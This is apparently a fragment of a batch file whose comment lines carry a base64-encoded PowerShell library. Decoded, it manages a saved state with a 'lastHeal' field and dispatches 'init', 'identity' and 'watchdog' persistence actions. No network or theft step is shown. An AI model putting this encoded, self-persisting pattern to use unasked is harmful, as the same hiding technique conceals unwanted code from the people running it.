::CgkcHJldi5sYXN0SGVhbCkgeyAkcHJldi5sYXN0SGVhbCB9IGVsc2UgeyAkbnVsbCB9KQ0KICAg
::ICAgICBub3RlICAgICAgICAgPSAkRXh0cmENCiAgICB9DQogICAgKCRzdGF0ZSB8IENvbnZlcnR
::Uby1Kc29uIC1Db21wcmVzcykgfCBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aC
::AtRm9yY2UNCiAgICByZXR1cm4gJHN0YXRlDQp9DQoNCnN3aXRjaCAoJEFjdGlvbikgew0KICAgI
::Cdpbml0JyAgICAgICAgICAgIHsgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eTsgJGlkLkdldEVu
::dW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB
::9DQogICAgJ2lkZW50aXR5JyAgICAgICAgeyAkaWQgPSBSZWFkLUlkZW50aXR5OyAkaWQuR2V0RW
::51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9I
::H0NCiAgICAnd2F0Y2hkb2cnICAgICAgICB7IEluc3RhbGwtV2F0Y2hkb2cgfCBPdXQtTnVsbCB9
::DQogICAgJ3dhdGNoZG9nLWVuc3VyZScgeyBFbnN1cmUtV2F0Y2hkb2cgfQ0KICAgICdzdGF0ZSc
::gICAgICAgICAgIHsgVXBkYXRlLVN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0NCn
::0NCg==
::B64_LIB_END